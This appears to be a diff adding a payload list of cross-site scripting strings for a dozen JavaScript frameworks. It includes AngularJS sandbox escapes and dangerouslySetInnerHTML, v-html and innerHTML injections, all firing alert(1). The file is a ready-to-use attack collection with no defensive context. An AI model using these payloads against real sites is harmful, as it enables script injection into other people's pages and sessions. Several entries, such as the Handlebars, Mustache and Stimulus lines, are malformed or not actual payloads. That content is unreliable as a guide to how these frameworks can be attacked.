@@ -1,0 +1,55 @@
+# Advanced Framework-Specific XSS Payloads (2025 Edition)
+
+# AngularJS
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\._){window\\._=1;alert(1)}')+'\"';")}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+
+# React
+React.createElement('div', {dangerouslySetInnerHTML: {__html: '<img src=x onerror=alert(1)>'}})
+React.createElement('div', {dangerouslySetInnerHTML: {__html: '<svg onload=alert(1)>'}})
+React.createElement('div', {dangerouslySetInnerHTML: {__html: '<iframe src=javascript:alert(1)>'}})
+
+# Vue.js
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div v-html="'<svg onload=alert(1)>'"></div>
+
+# Ember.js
+{{html-safe '<img src=x onerror=alert(1)>'}}
+{{html-safe '<svg onload=alert(1)>'}}
+
+# Handlebars
+{{{<img src=x onerror=alert(1)>}}}
+{{{<svg onload=alert(1)>}}}
+
+# Mustache
+{{{<img src=x onerror=alert(1)>}}}
+{{{<svg onload=alert(1)>}}}
+
+# jQuery
+$('selector').html('<img src=x onerror=alert(1)>')
+$('selector').append('<svg onload=alert(1)>')
+
+# Svelte
+<div bind:innerHTML={"<img src=x onerror=alert(1)>"} />
+
+# Alpine.js
+<div x-data="{ payload: '<img src=x onerror=alert(1)>' }" x-html="payload"></div>
+
+# Lit/Web Components
+<my-element .innerHTML=${"<img src=x onerror=alert(1)>"}>
+
+# Solid.js
+<div innerHTML={"<img src=x onerror=alert(1)>"} />
+
+# Preact
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+
+# Stimulus
+<div data-controller="xss" data-action="click->xss#exploit"></div>
+
+# Meteor
+{{{unsafeHtml}}} <!-- Where unsafeHtml = "<img src=x onerror=alert(1)>" -->
+
+# More advanced payloads in custom_payloads/framework.txt
